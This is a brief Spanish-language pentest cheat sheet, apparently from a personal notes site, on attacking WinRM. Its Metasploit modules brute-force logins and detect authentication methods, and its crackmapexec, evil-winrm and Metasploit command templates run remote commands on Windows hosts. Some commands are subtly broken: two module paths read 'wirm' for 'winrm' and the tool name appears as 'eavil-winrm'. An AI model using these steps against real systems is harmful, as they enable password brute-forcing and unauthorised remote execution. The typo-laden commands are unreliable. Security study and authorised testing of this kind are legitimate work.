---
title: "WinRM"
layout: "single"
category: "Servicios comunes"
slug: "servicios-comunes/winrm"
date: "2025-09-30"
---

### Enumeracion
Si ya tenemos algun usuario mucho mejor, sino podemos tratar de realizar un ataque de fuerza bruta.

![[2 - Enumeracion#Enumerar usuarios Active Directory]]

#### WinRM Auth method detection
```bash
metasploit:
#Winrm Auth method detection
/auxiliary/scanner/wirm/winrm_auth_methods
```

#### WinRM login fuerza bruta
```bash
metasploit:
#Winrm Login utility
/auxiliary/scanner/wirm/winrm_login

## AQUIÍ INTERESA USAR UN FICHERO CON USUARIOS Y CONTRASEÑAS, O SI SE TIENE USUARIO, HACER FUERZA BRUTA A LA PASS.

```
### Ejecución de comandos
#### WinRM RCE crackmapexec
```bash
crackmapexec winrm <ip> -u <usuario> -p <pass> -x "Comando"
```

#### WinRM RCE evil-winrm
```bash
eavil-winrm -u <usuario> -p <pass> -i <ip>
```

#### WinRM RCE metasploit
```bash
use exploit/windows/winrm/winrm_script_exec
#si no tira, habilitamos la opcion (set FORCE_VBS en true)

##teniendo credenciales se puede ejecutar comandos
auxiliary/scanner/winrm/winrm_cmd
```

